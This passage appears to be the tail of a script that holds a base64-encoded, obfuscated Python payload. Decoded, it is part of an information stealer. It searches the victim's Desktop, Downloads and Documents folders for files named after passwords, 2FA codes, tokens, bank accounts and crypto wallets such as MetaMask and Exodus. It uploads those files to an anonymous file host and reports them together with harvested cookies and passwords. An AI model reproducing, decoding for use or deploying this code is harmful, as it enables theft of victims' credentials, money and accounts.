aXdpRm9sZGVyKHBhdGhGLCBrZXl3b3Jkcyk6CiAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICBtYXhmaWxlc3BlcmRpciA9IDcKICAgIGkgPSAwCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoRikKICAgIGZmb3VuZCA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoRiArICIvIiArIGZpbGUpOiByZXR1cm4KICAgICAgICBpICs9IDEKICAgICAgICBpZiBpIDw9IG1heGZpbGVzcGVyZGlyOgogICAgICAgICAgICB1cmwgPSB1cGxvYWRUb0Fub25maWxlcyhwYXRoRiArICIvIiArIGZpbGUpCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQoKS2l3aUZpbGVzID0gW10KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToKICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgIGZpZm91bmQgPSBbXQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgZm9yIHdvcmYgaW4ga2V5d29yZHM6CiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCAiLnR4dCIgaW4gZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWZvdW5kLmFwcGVuZChbcGF0aCArICIvIiArIGZpbGUsIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGggKyAiLyIgKyBmaWxlKV0pCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIocGF0aCArICIvIiArIGZpbGUpOgogICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IHBhdGggKyAiLyIgKyBmaWxlCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQoKZGVmIEtpd2koKToKICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdCiAgICBwYXRoMnNlYXJjaCA9IFsKICAgICAgICB1c2VyICsgIi9EZXNrdG9wIiwKICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLAogICAgICAgIHVzZXIgKyAiL0RvY3VtZW50cyIKICAgIF0KCiAgICBrZXlfd29yZHNGb2xkZXIgPSBbCiAgICAgICAgImFjY291bnQiLAogICAgICAgICJhY291bnQiLAogICAgICAgICJwYXNzdyIsCiAgICAgICAgInNlY3JldCIKCiAgICBdCgogICAga2V5X3dvcmRzRmlsZXMgPSBbCiAgICAgICAgInBhc3N3IiwKICAgICAgICAibWRwIiwKICAgICAgICAibW90ZGVwYXNzZSIsCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsCiAgICAgICAgImxvZ2luIiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBheXBhbCIsCiAgICAgICAgImJhbnF1ZSIsCiAgICAgICAgImFjY291bnQiLAogICAgICAgICJtZXRhbWFzayIsCiAgICAgICAgIndhbGxldCIsCiAgICAgICAgImNyeXB0byIsCiAgICAgICAgImV4b2R1cyIsCiAgICAgICAgImRpc2NvcmQiLAogICAgICAgICIyZmEiLAogICAgICAgICJjb2RlIiwKICAgICAgICAibWVtbyIsCiAgICAgICAgImNvbXB0ZSIsCiAgICAgICAgInRva2VuIiwKICAgICAgICAiYmFja3VwIiwKICAgICAgICAic2VjcmV0IgogICAgICAgIF0KCiAgICB3aWtpdGggPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6IAogICAgICAgIGtpd2kgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1LaXdpRmlsZSwgYXJncz1bcGF0dCwga2V5X3dvcmRzRmlsZXNdKTtraXdpLnN0YXJ0KCkKICAgICAgICB3aWtpdGguYXBwZW5kKGtpd2kpCiAgICByZXR1cm4gd2lraXRoCgoKZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3JkcywgQ29va2lDb3VudCwgUGFzc3dDb3VudCwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAoKa2V5d29yZCA9IFsKICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknCl0KCkNvb2tpQ291bnQsIFBhc3N3Q291bnQgPSAwLCAwCmNvb2tpV29yZHMgPSBbXQpwYXN3V29yZHMgPSBbXQoKV2FsbGV0c1ppcCA9IFtdICMgW05hbWUsIExpbmtdCkdhbWluZ1ppcCA9IFtdCk90aGVyWmlwID0gW10KCkdhdGhlckFsbCgpCkRFVEVDVEVEID0gVHJ1c3QoQ29va2llcykKIyBERVRFQ1RFRCA9IEZhbHNlCmlmIG5vdCBERVRFQ1RFRDoKICAgIHdpa2l0aCA9IEtpd2koKQoKICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOiB0aHJlYWQuam9pbigpCiAgICB0aW1lLnNsZWVwKDAuMikKCiAgICBmaWxldGV4dCA9ICJcbiIKICAgIGZvciBhcmcgaW4gS2l3aUZpbGVzOgogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6CiAgICAgICAgICAgIGZvbGRwYXRoID0gYXJnWzFdCiAgICAgICAgICAgIGZvbGRsaXN0ID0gYXJnWzJdICAgICAgIAogICAgICAgICAgICBmaWxldGV4dCArPSBmIvCfk4Ege2ZvbGRwYXRofVxuIgoKICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6CiAgICAgICAgICAgICAgICBhID0gZmZpbFswXS5zcGxpdCgiLyIpCiAgICAgICAgICAgICAgICBmaWxlYW5tZSA9IGFbbGVuKGEpLTFdCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQogICAgICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLilJTilIA6b3Blbl9maWxlX2ZvbGRlcjogW3tmaWxlYW5tZX1dKHtifSlcbiIKICAgICAgICAgICAgZmlsZXRleHQgKz0gIlxuIgogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQpCg==
"""
))
